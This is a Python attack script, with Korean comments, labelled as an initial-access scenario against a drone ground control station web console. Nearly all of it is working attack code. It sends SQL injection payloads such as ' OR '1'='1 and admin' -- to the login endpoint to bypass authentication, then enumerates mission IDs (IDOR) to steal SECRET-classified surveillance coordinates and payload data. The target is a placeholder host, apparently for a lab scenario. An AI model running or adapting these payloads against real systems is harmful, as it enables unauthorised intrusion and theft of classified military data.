"""
S1 - GCS 웹 대시보드 침투 : SQL Injection 인증 우회 + IDOR
=========================================================
목표(방산 맥락): 지상통제소(GCS) 웹 콘솔에 인증 없이 진입하여
운용자 권한을 탈취하고, 접근권한이 없는 '기밀(SECRET)' 임무 데이터
(감시 좌표·페이로드)를 열람한다. 초기 침투(Initial Access) 단계.

기법:
  1) 로그인 파라미터에 ' OR '1'='1 계열 페이로드로 인증 우회
  2) IDOR: /api/mission/<id> 를 순차 열거하여 타 사용자 기밀 임무 탈취
"""
import sys
import json
import requests

def run(target="http://victim:8080"):
    result = {"scenario": "S1_web_sqli", "target": target, "steps": []}
    s = requests.Session()

    # 1) SQLi 인증 우회
    payloads = [
        {"username": "admin' --", "password": "x"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "operator", "password": "operator123"},  # 대조군(정상)
    ]
    bypass = None
    for p in payloads:
        try:
            r = s.post(f"{target}/api/login", json=p, timeout=5)
            ok = r.json().get("ok")
            result["steps"].append(
                {"action": "login", "payload": p, "status": r.status_code,
                 "ok": ok, "body": r.json()})
            if ok and "OR" in p["username"] or (ok and "--" in p["username"]):
                bypass = p
                break
        except Exception as e:
            result["steps"].append({"action": "login", "payload": p, "error": str(e)})

    # 2) IDOR: 임무 1..5 열거
    stolen = []
    for mid in range(1, 6):
        try:
            r = s.get(f"{target}/api/mission/{mid}", timeout=5)
            if r.status_code == 200 and r.json().get("ok"):
                m = r.json()["mission"]
                stolen.append({"id": m["id"], "title": m["title"],
                               "classification": m["classification"],
                               "payload": m["payload"]})
        except Exception:
            pass
    result["steps"].append({"action": "idor_enumerate", "stolen_missions": stolen})

    secret = [m for m in stolen if m["classification"] == "SECRET"]
    result["success"] = bool(bypass) and bool(secret)
    result["impact"] = (f"인증 우회 성공 + 기밀 임무 {len(secret)}건 탈취"
                        if result["success"] else "부분 실패/차단")
    return result


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else "http://victim:8080"
    print(json.dumps(run(t), ensure_ascii=False, indent=2))
